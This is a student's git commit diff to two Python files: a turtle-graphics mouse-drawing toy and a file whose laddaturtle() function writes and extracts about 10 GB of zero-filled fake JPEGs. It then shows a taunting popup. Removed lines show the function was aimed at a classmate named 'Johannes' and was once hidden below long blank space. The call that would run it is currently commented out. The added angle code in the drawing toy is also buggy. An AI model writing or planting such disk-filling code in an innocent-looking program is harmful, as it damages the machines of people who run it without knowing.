2749d62ff840a8c067529579b6efc4a70eacbb08
jag <vilgot.sundin@skola.taby.se>
2026-05-13 13:13:23 +0200

    Nåt är fel

--- Turtlegrej.py
+++ Turtlegrej.py
@@ -7,11 +7,7 @@ from pynput import keyboard
 import os
 import ctypes 
 
-
-ctypes.windll.user32.MessageBoxW(0, "Tryck Escape för att stänga ner och X för att rensa ritytan", "Sköldpadda", 1)
-
-
-"""laddaturtle()"""
+ctypes.windll.user32.MessageBoxW(0, "Tryck Escape för att stänga ner och X för att rensa ritytan (Enbart fantasin sätter gränserna i denna underbara värld, på så sätt är det lite som LEGO. Viste du att LEGO står för lek go eller något och enligt vad jag har förstått står det för lek kul eller något, så lek kul här🤩)", "Sköldpadda ", 1)
 
 färger = ["#0cedda","#25458a","#de47f5","#ff0000","#fffb00","#fffb00"]
 t = turtle.Turtle()
@@ -44,11 +40,28 @@ try:
             turtle.bgcolor("#abb8cc")
             t = turtle.Turtle()
             t.speed(9940)
+        
+        gamx = t.xcor()
+        gamy = t.ycor()
 
         x, y = pyautogui.position()
         t.setx(x / 4 - 300)
         t.sety(-y / 4 + 250)
         t.color(random.choice(färger))
+        
+        print("----")
+        print(gamx, gamy)
+        print("----")
+        print(t.xcor(), t.ycor())
+
+        deltx = t.xcor() - gamx
+        delty = t.ycor() - gamy
+
+        try:
+            vinkel = meth.atan(delty/deltx)
+        except ValueError:
+            print("NEJ!")
+        t.left(vinkel)
 
 except KeyboardInterrupt:
     print('\n')
--- Turtletest.py
+++ Turtletest.py
@@ -1,76 +1,14 @@
 import zipfile
 import os
+import threading
+import ctypes  # ← add this
+from concurrent.futures import ThreadPoolExecutor
+
 def laddaturtle():
 
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    OUTPUT_ZIP = "pictures_10gb.zip"
-    # Read Me !!!!
-
-    # Du får gratis 10 gb av bilder😊😊 varsogod Johannes!!!(Bli inte sur om det funkar, du borde förväntat dig sånt här tidigare...)
-
-    # Read Me !!!!
-
+    OUTPUT_ZIP = "Cutecat.zip"
     Antalfil = 100
     Filstorlek = 100 * 1024 * 1024 
-    TOTAL_GB = (Antalfil * Filstorlek) / (1024 ** 3)
     
     JPEG_HEADER = bytes([
         0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
@@ -81,15 +19,28 @@ def laddaturtle():
     
     FILLER = b"\x00" * (Filstorlek - len(JPEG_HEADER) - len(JPEG_FOOTER))
     FAKE_JPEG = JPEG_HEADER + FILLER + JPEG_FOOTER
-    
 
-    with zipfile.ZipFile(OUTPUT_ZIP, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
+    with zipfile.ZipFile(OUTPUT_ZIP, "w", compression=zipfile.ZIP_STORED) as zf:
         for i in range(1, Antalfil + 1):
             filename = f"pictures/photo_{i:04d}.jpg"
             zf.writestr(filename, FAKE_JPEG)
-    
 
-    # Här kommer filerna
-    zip_size_mb = os.path.getsize(OUTPUT_ZIP) / (1024 ** 2)
     with zipfile.ZipFile(OUTPUT_ZIP, "r") as zf:
-        zf.extractall("What illegal gambling??!")
+        names = zf.namelist()
+        items = [(name, zf.read(name)) for name in names]
+
+    def write_file(args):
+        name, data = args
+        out_path = os.path.join("What, illegal gambling??!", name)
+        os.makedirs(os.path.dirname(out_path), exist_ok=True)
+        with open(out_path, "wb") as f:
+            f.write(data)
+
+    os.makedirs("What, illegal gambling??!", exist_ok=True)
+    with ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
+        executor.map(write_file, items)
+
+    ctypes.windll.user32.MessageBoxW(0, "Du fick nyss 10 gb av bilder😘", "Gratis bilder!", 1)  # ← fixed
+
+"""a = threading.Thread(target=laddaturtle)
+a.start()"""
